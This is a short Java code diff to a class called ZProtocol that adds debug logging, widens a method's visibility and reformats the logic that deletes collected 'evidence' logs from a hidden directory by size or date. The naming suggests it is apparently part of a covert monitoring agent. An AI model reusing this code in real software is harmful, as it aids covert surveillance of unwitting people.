@@ -505,9 +505,13 @@ public class ZProtocol extends Protocol {
                     date = new Date(time * 1000);
                 }
 
+                //#ifdef DEBUG
+                debug.trace("parsePurge, date: " + date + " size: " + size);
+                //#endif
+
                 purgeEvidences(Path.hidden(), date, size);
             }
-            
+
         }
     }
 
@@ -769,7 +773,7 @@ public class ZProtocol extends Protocol {
         }
     }
 
-    private void purgeEvidences(String basePath, Date date, int size) {
+    protected void purgeEvidences(String basePath, Date date, int size) {
         EvidenceCollector logCollector = EvidenceCollector.getInstance();
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
@@ -789,14 +793,15 @@ public class ZProtocol extends Protocol {
                 final String fullLogName = basePath + dir + logName;
                 final AutoFile file = new AutoFile(fullLogName, false);
                 if (file.exists()) {
-                    if(size >0 && file.getSize() > size){
+                    if (size > 0 && file.getSize() > size) {
                         //#ifdef DEBUG
-                        debug.trace("purgeEvidences, removing due size: " + file);
+                        debug.info("purgeEvidences, removing due size: " + logName);
                         //#endif
                         file.delete();
-                    }else if(date!=null && file.lastModified() < date.getTime()){
-                      //#ifdef DEBUG
-                        debug.trace("purgeEvidences, removing due date: " + file);
+                    } else if (date != null
+                            && file.lastModified() < date.getTime()) {
+                        //#ifdef DEBUG
+                        debug.info("purgeEvidences, removing due date: " + logName);
                         //#endif
                         file.delete();
                     }
